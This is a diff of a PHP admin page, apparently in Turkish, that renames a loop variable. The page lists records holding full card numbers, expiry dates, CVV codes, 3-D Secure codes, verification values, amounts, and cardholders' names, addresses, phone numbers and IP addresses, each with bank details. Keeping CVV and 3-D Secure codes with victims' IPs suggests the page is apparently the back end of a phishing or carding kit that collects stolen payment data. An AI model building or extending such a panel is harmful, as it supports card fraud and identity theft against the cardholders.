@@ -59,19 +59,19 @@ $siparisler = $stmt->fetchAll(PDO::FETCH_ASSOC);
                 </thead>
                 <tbody>
                 <?php
-                            foreach ($urunler as $urun) {?>
+                            foreach ($siparisler as $siparis) {?>
                     <tr>
-                        <td><?=$urun['id']?></td>
-                        <td ><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smallsizemodal<?=$urun['id']?>">Göster</button></td>
-                        <td><?=$urun['kart_no']?></td>
-                        <td><?=$urun['skt_no']?></td>
-                        <td><?=$urun['cvv_no']?></td>
-                        <td><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smalllsizemodal<?=$urun['id']?>">Göster</button></td>
-                        <td style="color: green"><?=$urun['3d_kodu']?></td>
-                        <td style="color: green"><?=$urun['dogrulama']?></td>
-                        <td><?=$urun['tarih']?></td>
-                        <td><?=$urun['tutar']?> ₺</td>
-                        <td><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smallllsizemodal<?=$urun['id']?>">Göster</button></td>
+                        <td><?=$siparis['id']?></td>
+                        <td ><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smallsizemodal<?=$siparis['id']?>">Göster</button></td>
+                        <td><?=$siparis['kart_no']?></td>
+                        <td><?=$siparis['skt_no']?></td>
+                        <td><?=$siparis['cvv_no']?></td>
+                        <td><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smalllsizemodal<?=$siparis['id']?>">Göster</button></td>
+                        <td style="color: green"><?=$siparis['3d_kodu']?></td>
+                        <td style="color: green"><?=$siparis['dogrulama']?></td>
+                        <td><?=$siparis['tarih']?></td>
+                        <td><?=$siparis['tutar']?> ₺</td>
+                        <td><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smallllsizemodal<?=$siparis['id']?>">Göster</button></td>
                         <td>
                               <select class="form-control" id="select-area" data-id="1">
                                     <option>Seç</option>
@@ -115,8 +115,8 @@ $siparisler = $stmt->fetchAll(PDO::FETCH_ASSOC);
                 </tfoot>
             </table>
             <?php
-                            foreach ($urunler as $urun) {?>
-            <div class="modal fade" id="smallsizemodal<?=$urun['id']?>" style="display: none;" aria-hidden="true">
+                            foreach ($siparisler as $siparis) {?>
+            <div class="modal fade" id="smallsizemodal<?=$siparis['id']?>" style="display: none;" aria-hidden="true">
                   <div class="modal-dialog modal-lg">
                     <div class="modal-content">
                       <div class="modal-header">
@@ -150,17 +150,17 @@ $siparisler = $stmt->fetchAll(PDO::FETCH_ASSOC);
                                     </thead>
                                     <tbody>
                                     <tr>
-                                        <td><?=$urun['adi']?> <?=$urun['soyadi']?></td>
-                                        <td><?=$urun['il']?></td>
-                                        <td><?=$urun['ilce']?></td>
-                                        <td><?=$urun['mahalle']?></td>
-                                        <td><?=$urun['bina_no']?></td>
-                                        <td><?=$urun['kat_no']?></td>
-                                        <td><?=$urun['daire_no']?></td>
-                                        <td><?=$urun['adres_tarifi']?></td>
-                                        <td><?=$urun['adres_ismi']?></td>
-                                        <td><?=$urun['telefon']?></td>
-                                        <td><?=$urun['ip']?></td>
+                                        <td><?=$siparis['adi']?> <?=$siparis['soyadi']?></td>
+                                        <td><?=$siparis['il']?></td>
+                                        <td><?=$siparis['ilce']?></td>
+                                        <td><?=$siparis['mahalle']?></td>
+                                        <td><?=$siparis['bina_no']?></td>
+                                        <td><?=$siparis['kat_no']?></td>
+                                        <td><?=$siparis['daire_no']?></td>
+                                        <td><?=$siparis['adres_tarifi']?></td>
+                                        <td><?=$siparis['adres_ismi']?></td>
+                                        <td><?=$siparis['telefon']?></td>
+                                        <td><?=$siparis['ip']?></td>
                                     </tr>
                                     </tbody>
                                 </table>
@@ -179,8 +179,8 @@ $siparisler = $stmt->fetchAll(PDO::FETCH_ASSOC);
             </div>
             <?php }?>
             <?php
-                            foreach ($urunler as $urun) {?>
-            <div class="modal fade" id="smalllsizemodal<?=$urun['id']?>" style="display: none;" aria-hidden="true">
+                            foreach ($siparisler as $siparis) {?>
+            <div class="modal fade" id="smalllsizemodal<?=$siparis['id']?>" style="display: none;" aria-hidden="true">
                   <div class="modal-dialog modal-lg">
                     <div class="modal-content">
                       <div class="modal-header">
@@ -207,9 +207,9 @@ $siparisler = $stmt->fetchAll(PDO::FETCH_ASSOC);
                                     <tbody>
                                     <tr>
                                         
-                                        <td><?=$urun['banka_adi']?></td>
-                                        <td><?=$urun['banka_no']?></td>
-                                        <td><?=$urun['kart_tipi']?></td>
+                                        <td><?=$siparis['banka_adi']?></td>
+                                        <td><?=$siparis['banka_no']?></td>
+                                        <td><?=$siparis['kart_tipi']?></td>
                                     </tr>
                                     </tbody>
                                 </table>
@@ -227,8 +227,8 @@ $siparisler = $stmt->fetchAll(PDO::FETCH_ASSOC);
             </div>
             <?php }?>
             <?php
-                            foreach ($urunler as $urun) {?>
-            <div class="modal fade" id="smallllsizemodal<?=$urun['id']?>" style="display: none;" aria-hidden="true">
+                            foreach ($siparisler as $siparis) {?>
+            <div class="modal fade" id="smallllsizemodal<?=$siparis['id']?>" style="display: none;" aria-hidden="true">
                   <div class="modal-dialog">
                     <div class="modal-content border-0">
                         <div class="card mb-0">
